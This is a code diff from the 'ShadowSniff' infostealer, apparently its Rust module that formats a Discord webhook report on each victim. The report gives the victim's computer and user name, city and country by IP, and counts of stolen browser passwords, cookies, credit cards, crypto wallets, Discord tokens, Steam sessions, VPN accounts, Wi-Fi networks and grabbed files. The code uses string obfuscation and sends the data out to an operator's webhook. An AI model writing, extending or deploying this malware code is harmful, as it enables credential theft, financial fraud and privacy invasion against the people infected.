@@ -1,16 +1,22 @@
 use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
+use alloc::vec::Vec;
 use alloc::{format, vec};
-use collector::{Browser, Collector, Device, FileGrabber, Software, Vpn};
+use collector::display::{CollectorBlock, CollectorDisplay};
+use collector::{Collector, Device};
+use core::fmt::Write;
+use core::fmt::{Display, Formatter};
 use derive_new::new;
-use indoc::formatdoc;
+use indoc::{formatdoc, writedoc};
+use ipinfo::{unwrapped_ip_info, IpInfo};
 use obfstr::obfstr as s;
 use requests::{
     write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request,
     RequestBuilder,
 };
-use utils::format_size;
+use utils::pc_info::PcInfo;
+use utils::{format_size, internal_code_to_flag};
 
 /// A log sender that transmits data to a Discord channel using a webhook.
 ///
@@ -30,18 +36,62 @@ pub struct DiscordWebhookSender {
     webhook: Arc<str>,
 }
 
+struct DiscordEmbedFieldBlockDisplay<'a>(&'a CollectorBlock);
+
+impl Display for DiscordEmbedFieldBlockDisplay<'_> {
+    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
+        let mut body = String::new();
+
+        for field in self.0.fields.iter() {
+            writeln!(
+                body,
+                "> {} {}: **{}**",
+                field.emoji, field.name, field.value
+            )?;
+        }
+
+        if body.ends_with('\n') {
+            body.pop();
+        }
+
+        writedoc!(
+            f,
+            r#"
+            {{
+                "name": "{emoji} {name}",
+                "value": "{body}",
+                "inline": true
+            }}
+            "#,
+            emoji = self.0.emoji,
+            name = self.0.name,
+            body = body.replace("\n", "\\n")
+        )
+    }
+}
+
 fn generate_embed<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> String
 where
     P: AsRef<str>,
     C: Collector,
 {
+    let PcInfo {
+        computer_name,
+        user_name,
+        product_name,
+    } = PcInfo::retrieve();
+    let IpInfo { country, city, .. } = unwrapped_ip_info();
+    let country_flag = internal_code_to_flag(&country)
+        .map(Arc::from)
+        .unwrap_or(country.clone());
+
     let link = match log {
         LogContent::ExternalLink(ExternalLink {
             service_name,
             link,
             size,
         }) => Some(format!(
-            r#"[Download from {service_name} [{size}]]({link})"#,
+            r#"[Download]({link}) from {service_name} **{size}**"#,
             size = format_size(*size as _)
         )),
         _ => None,
@@ -52,7 +102,11 @@ where
         format!(r#"Password: ||{password}||"#)
     });
 
-    let mut parts = vec![];
+    let mut parts = vec![
+        format!("✨ New log from {country_flag} **{city}**"),
+        format!("Victim: **{computer_name}**/**{user_name}** on **{product_name}**"),
+        "".to_string(),
+    ];
     if let Some(l) = link {
         parts.push(l);
     }
@@ -62,67 +116,34 @@ where
     let description = if parts.is_empty() {
         "".to_string()
     } else {
-        parts.join("\\n")
+        parts.join("\n")
     };
+
+    let fields = collector
+        .display_blocks()
+        .iter()
+        .map(DiscordEmbedFieldBlockDisplay)
+        .map(|x| x.to_string())
+        .collect::<Vec<_>>()
+        .join(", ");
 
     formatdoc! {
         r#"
         {{
-          "title": "New log",
           "description": "{description}",
           "color": 14627378,
           "fields": [
-            {{
-              "name": "Browser",
-              "value": "```\nCookies: {cookies}\nPasswords: {passwords}\nCredit cards: {credit_cards}\nAuto fills: {auto_fills}\nHistory: {history}\nBookmarks: {bookmarks}\nDownloads: {downloads}\n```",
-              "inline": true
-            }},
-            {{
-              "name": "Software",
-              "value": "```\nWallets: {wallets}\nFtp hosts: {ftp_hosts}\nTelegram: {telegram}\nDiscord tokens: {discord_tokens}\nSteam sessions: {steam_sessions}\n```",
-              "inline": true
-            }},
-            {{
-              "name": "Files",
-              "value": "```\nSource code: {source_code}\nDatabase: {databases}\nDocuments: {documents}\n```"
-            }},
-            {{
-              "name": "Vpn",
-              "value": "```\nAccounts: {vpn_accounts}\n```"
-            }},
-            {{
-              "name": "Device",
-              "value": "```\nWifi networks: {wifi_networks}\n```"
-            }}
+            {fields}
           ],
           "author": {{
-            "name": "ShadowSniff"
+            "name": "ShadowSniff",
+            "url": "https://github.com/sqlerrorthing/ShadowSniff"
           }},
           "footer": {{
-            "text": "ShadowSniff"
+            "text": "by ShadowSniff, made with ❤️"
           }}
         }}"#,
-        cookies = collector.get_browser().get_cookies(),
-        passwords = collector.get_browser().get_passwords(),
-        credit_cards = collector.get_browser().get_credit_cards(),
-        auto_fills = collector.get_browser().get_auto_fills(),
-        history = collector.get_browser().get_history(),
-        bookmarks = collector.get_browser().get_bookmarks(),
-        downloads = collector.get_browser().get_downloads(),
-
-        wallets = collector.get_software().get_wallets(),
-        ftp_hosts = collector.get_software().get_ftp_hosts(),
-        telegram = collector.get_software().is_telegram(),
-        discord_tokens = collector.get_software().get_discord_tokens(),
-        steam_sessions = collector.get_software().get_steam_session(),
-
-        source_code = collector.get_file_grabber().get_source_code_files(),
-        databases = collector.get_file_grabber().get_database_files(),
-        documents = collector.get_file_grabber().get_documents(),
-
-        vpn_accounts = collector.get_vpn().get_accounts(),
-
-        wifi_networks = collector.get_device().get_wifi_networks()
+        description = description.replace("\n", "\\n"),
     }
 }
 
